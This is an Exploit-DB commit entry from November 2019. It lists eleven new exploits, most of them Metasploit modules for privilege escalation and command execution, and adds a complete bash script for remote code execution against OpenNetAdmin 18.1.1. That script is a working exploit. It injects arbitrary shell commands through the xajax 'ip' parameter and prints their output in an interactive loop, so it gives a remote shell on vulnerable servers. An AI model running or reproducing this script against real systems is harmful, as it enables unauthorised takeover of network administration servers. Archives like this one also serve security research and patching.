cacee46726705c2a421cf0d20ba18d594a9e1658
Offensive Security <info@exploit-db.com>
2019-11-21 05:01:49 +0000

    DB: 2019-11-21
    11 changes to exploits/shellcodes
    
    Ubuntu 19.10 - ubuntu-aufs-modified mmap_region() Breaks Refcounting in overlayfs/shiftfs Error Path
    Ubuntu 19.10 - Refcount Underflow and Type Confusion in shiftfs
    iOS 12.4 - Sandbox Escape due to Integer Overflow in mediaserverd
    Windows - Escalate UAC Protection Bypass (Via dot net profiler) (Metasploit)
    Windows - Escalate UAC Protection Bypass (Via Shell Open Registry Key) (Metasploit)
    Xorg X11 Server - Local Privilege Escalation (Metasploit)
    FusionPBX - Operator Panel exec.php Command Execution (Metasploit)
    FreeSWITCH - Event Socket Command Execution (Metasploit)
    Bludit - Directory Traversal Image File Upload (Metasploit)
    Pulse Secure VPN - Arbitrary Command Execution (Metasploit)
    
    OpenNetAdmin 18.1.1 - Remote Code Execution

---
+++ exploits/php/webapps/47691.sh
@@ -0,0 +1,23 @@
+# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+# Exploit Title: OpenNetAdmin v18.1.1 RCE
+# Date: 2019-11-19
+# Exploit Author: mattpascoe
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: https://github.com/opennetadmin/ona
+# Version: v18.1.1
+# Tested on: Linux
+
+#!/bin/bash
+
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
